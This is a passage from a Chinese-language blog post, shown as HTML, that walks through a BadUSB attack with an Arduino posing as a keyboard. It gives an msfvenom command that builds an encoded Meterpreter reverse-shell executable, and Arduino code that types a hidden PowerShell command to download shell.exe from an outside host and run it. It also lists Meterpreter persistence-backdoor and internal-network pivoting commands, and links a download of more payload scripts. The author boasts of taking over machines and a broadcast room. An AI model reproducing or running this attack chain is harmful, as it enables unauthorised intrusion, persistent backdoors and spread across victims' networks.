+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006145.png" alt="image-20230527100624124" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006145.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006145.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271006145.png?size=large 2x" data-title="image-20230527100624124" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>接着我们用Msfvenom生成可执行文件,代码如下：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">msfvenom -p windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>平台给出的IP <span class="nv">LPORT</span><span class="o">=</span>平台给出的端口 -e x86/shikata_ga_nai -b <span class="s2">&#34;\x00&#34;</span> -i <span class="m">5</span> -a x86 --platform win <span class="nv">PrendMigrate</span><span class="o">=</span><span class="nb">true</span> <span class="nv">PrendMigrateProc</span><span class="o">=</span>svchost.exe -f exe -o /root/shell.exe</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注：如果是64位系统，Payload则更改为：windows/x64/meterpreter/reverse_tcp对于小白很陌生带两个值是可以实现自动迁移进程的功能，关闭其中一进程并不影响另一进程。</p>
+<p>-k选项并不适用于所有模板，请提前做好测试。</p>
+<h2 id="安装arduino" class="heading-element"><span><strong>安装Arduino</strong></span>
+  <a href="#%e5%ae%89%e8%a3%85arduino" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>首先我们打开<strong><strong>arduino</strong></strong>安装包</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008384.png" alt="image-20230527100811363" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008384.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008384.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008384.png?size=large 2x" data-title="image-20230527100811363" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008365.png" alt="image-20230527100815346" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008365.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008365.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008365.png?size=large 2x" data-title="image-20230527100815346" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008341.png" alt="image-20230527100819320" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008341.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008341.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008341.png?size=large 2x" data-title="image-20230527100819320" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008382.png" alt="image-20230527100823362" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008382.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008382.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008382.png?size=large 2x" data-title="image-20230527100823362" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008024.png" alt="image-20230527100826999" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008024.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008024.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008024.png?size=large 2x" data-title="image-20230527100826999" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>完成了安装。</strong></p>
+<p><strong>配置如下：</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008524.png" alt="image-20230527100836501" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008524.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008524.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008524.png?size=large 2x" data-title="image-20230527100836501" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>完成安装。</p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008300.png" alt="image-20230527100849268" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008300.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008300.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271008300.png?size=large 2x" data-title="image-20230527100849268" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="烧录代码" class="heading-element"><span><strong>烧录代码</strong></span>
+  <a href="#%e7%83%a7%e5%bd%95%e4%bb%a3%e7%a0%81" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>代码贴出</strong>：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#include &lt;Keyboard.h&gt;</span>
+</span></span><span class="line"><span class="cl">void setup<span class="o">()</span> <span class="o">{</span>//初始化
+</span></span><span class="line"><span class="cl">  Keyboard.begin<span class="o">()</span><span class="p">;</span>//开始键盘通讯 
+</span></span><span class="line"><span class="cl">  delay<span class="o">(</span>5000<span class="o">)</span><span class="p">;</span>//延时
+</span></span><span class="line"><span class="cl">  Keyboard.press<span class="o">(</span>KEY_LEFT_GUI<span class="o">)</span><span class="p">;</span>//win键 
+</span></span><span class="line"><span class="cl">  delay<span class="o">(</span>500<span class="o">)</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">  Keyboard.press<span class="o">(</span><span class="s1">&#39;r&#39;</span><span class="o">)</span><span class="p">;</span>//r键 
+</span></span><span class="line"><span class="cl">  delay<span class="o">(</span>500<span class="o">)</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">  Keyboard.release<span class="o">(</span>KEY_LEFT_GUI<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  Keyboard.release<span class="o">(</span><span class="s1">&#39;r&#39;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  delay<span class="o">(</span>500<span class="o">)</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">  Keyboard.press<span class="o">(</span>KEY_CAPS_LOCK<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  Keyboard.release<span class="o">(</span>KEY_CAPS_LOCK<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  Keyboard.println<span class="o">(</span><span class="s2">&#34;CMD.EXE /t:01 /k MODE con: cols=16 lines=2&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  delay<span class="o">(</span>1000<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  Keyboard.println<span class="o">(</span><span class="s2">&#34;POWERSHELL -cOMMAND </span><span class="nv">$CLNT</span><span class="s2"> = NEW-OBJECT sYSTEM.nET.wEBcLIENT;</span><span class="nv">$URL</span><span class="s2">= &#39;http://ip/shell.exe&#39;;</span><span class="nv">$FILE</span><span class="s2"> = &#39; c:\\SHELL.EXE &#39;;</span><span class="nv">$CLNT</span><span class="s2">.dOWNLOADfILE(</span><span class="nv">$URL</span><span class="s2">,</span><span class="nv">$FILE</span><span class="s2">);&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  delay<span class="o">(</span>3000<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  Keyboard.println<span class="o">(</span><span class="s2">&#34;C:\\SHELL.EXE&amp;EXIT&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  Keyboard.press<span class="o">(</span>KEY_CAPS_LOCK<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  Keyboard.release<span class="o">(</span>KEY_CAPS_LOCK<span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  Keyboard.end<span class="o">()</span><span class="p">;</span>//结束键盘通讯 
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">void loop<span class="o">()</span>//循环
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009369.png" alt="image-20230527100923342" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009369.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009369.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009369.png?size=large 2x" data-title="image-20230527100923342" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>更多代码在文章底部有相关信息，不要着急！</p>
+<p><strong>编译好之后我们直接上传即可完成烧录，直接点击上传可以检查编译并上传。</strong></p>
+<h2 id="shell快到碗里来" class="heading-element"><span><strong>Shell快到碗里来</strong></span>
+  <a href="#shell%e5%bf%ab%e5%88%b0%e7%a2%97%e9%87%8c%e6%9d%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009772.png" alt="image-20230527100942749" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009772.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009772.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271009772.png?size=large 2x" data-title="image-20230527100942749" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>让基友给我赶烧：</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010902.png" alt="image-20230527101008879" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010902.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010902.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010902.png?size=large 2x" data-title="image-20230527101008879" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>如图：</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010010.png" alt="image-20230527101016985" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010010.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010010.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271010010.png?size=large 2x" data-title="image-20230527101016985" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>我们已经获取到了<strong><strong>Meterpreter</strong></strong>会话，现在我们可以为所欲为了！</strong></p>
+<p><strong>为了防止亡羊补牢，要一劳永逸，我们先添加一个持久后门，命令如下：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">run persistence -X -i <span class="m">5</span> -p 端口 -r IP
+</span></span><span class="line"><span class="cl">或者
+</span></span><span class="line"><span class="cl">run metsvc</span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>第二种方法直接监听即可，具体方法找谷哥和度娘。</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011208.png" alt="image-20230527101110186" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011208.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011208.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011208.png?size=large 2x" data-title="image-20230527101110186" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>附带一张屏幕截图：</strong></p>
+<pre tabindex="0"><code>screenshot</code></pre><p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011598.png" alt="image-20230527101127573" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011598.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011598.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011598.png?size=large 2x" data-title="image-20230527101127573" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>打开偷窥一下：</strong></p>
+<p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011626.png" alt="image-20230527101137573" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011626.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011626.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011626.png?size=large 2x" data-title="image-20230527101137573" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<h2 id="内网漫游" class="heading-element"><span><strong>内网漫游</strong></span>
+  <a href="#%e5%86%85%e7%bd%91%e6%bc%ab%e6%b8%b8" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011699.png" alt="image-20230527101147676" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011699.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011699.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271011699.png?size=large 2x" data-title="image-20230527101147676" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>查看子网：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">查看子网：
+</span></span><span class="line"><span class="cl">run get_local_subnets
+</span></span><span class="line"><span class="cl">添加路由：
+</span></span><span class="line"><span class="cl">route add 子网 掩码 会话id
+</span></span><span class="line"><span class="cl">查看路由：
+</span></span><span class="line"><span class="cl">route print
+</span></span><span class="line"><span class="cl">自动化添加路由：
+</span></span><span class="line"><span class="cl">load auto_add_route</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271012737.png" alt="image-20230527101214707" srcset="https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271012737.png?size=small, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271012737.png?size=medium 1.5x, https://fastly.jsdelivr.net/gh/hack-scan/Blog-pic/posts/202305271012737.png?size=large 2x" data-title="image-20230527101214707" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><strong>额</strong>&hellip;&hellip;.好吧 得退出meterpreter会话，因不可描述因素，就这样吧。</p>
+<p>提示得运行一个Post模块，并且添加参数，大家明白就好。</p>
+<p><strong>设置完毕后接下来就看自己的操作了，</strong></p>
+<p><strong>广播室也被搞定，也是因不可描述规章制度等原因不再继续。</strong></p>
+<p><strong>正文到此结束。</strong></p>
+<h2 id="总结" class="heading-element"><span><strong>总结</strong></span>
+  <a href="#%e6%80%bb%e7%bb%93" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>1.要提前知晓操作系统。</p>
+<p>2.根据不同的系统要构造不同的Payload。</p>
+<p>3.采用多种可执行后缀（<strong>bat</strong>、<strong>exe</strong>、<strong>docx</strong>）。</p>
+<p>4.获取<strong>Shell</strong>要第一时间添加后门。</p>
+<p>5.<strong>不推荐使用</strong>Ngrok，自行百度其他平台，但使用方法基本一致。</p>
+<p>6.<strong>添加完路由如果有网络异常状态，则删除路由条目。</strong></p>
+<p><strong>代码以烧录器整理集合如下：</strong></p>
+<p>(<strong>均来自互联网、适用与否请提前在虚拟机测试</strong>)</p>
+<p><strong>打开烧录脚本软件，点击文件</strong>&ndash;打开即可。</p>
+<a href="https://pan.baidu.com/s/17UCyKosBkjCRb7IBfxfdPg%20"target="_blank" rel="external nofollow noopener noreferrer" class="card-link" download="安装包"><span class="cl-backdrop" style="--cl-bg-url: url(/images/fixit.min.svg);"></span>
+    <span class="cl-content">
+      <span class="cl-text">
+        <span class="cl-title"> 提取码：btmz </span>
+        <span class="cl-meta">
+          <svg class="cl-icon-link" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16"><path d="M574 665.4c-3.1-3.1-8.2-3.1-11.3 0L446.5 781.6c-53.8 53.8-144.6 59.5-204 0-59.5-59.5-53.8-150.2 0-204l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3l-39.8-39.8c-3.1-3.1-8.2-3.1-11.3 0L191.4 526.5c-84.6 84.6-84.6 221.5 0 306s221.5 84.6 306 0l116.2-116.2c3.1-3.1 3.1-8.2 0-11.3L574 665.4zM832.6 191.4c-84.6-84.6-221.5-84.6-306 0L410.3 307.6c-3.1 3.1-3.1 8.2 0 11.3l39.7 39.7c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c53.8-53.8 144.6-59.5 204 0 59.5 59.5 53.8 150.2 0 204L665.3 562.6c-3.1 3.1-3.1 8.2 0 11.3l39.8 39.8c3.1 3.1 8.2 3.1 11.3 0l116.2-116.2c84.5-84.6 84.5-221.5 0-306.1z" fill="#a9a9b3"></path><path d="M610.1 372.3c-3.1-3.1-8.2-3.1-11.3 0L372.3 598.7c-3.1 3.1-3.1 8.2 0 11.3l39.6 39.6c3.1 3.1 8.2 3.1 11.3 0l226.4-226.4c3.1-3.1 3.1-8.2 0-11.3l-39.5-39.6z" fill="#a9a9b3"></path></svg>
+          <span class="cl-url">https://pan.baidu.com/s/17UCyKosBkjCRb7IBfxfdPg </span>
+        </span>
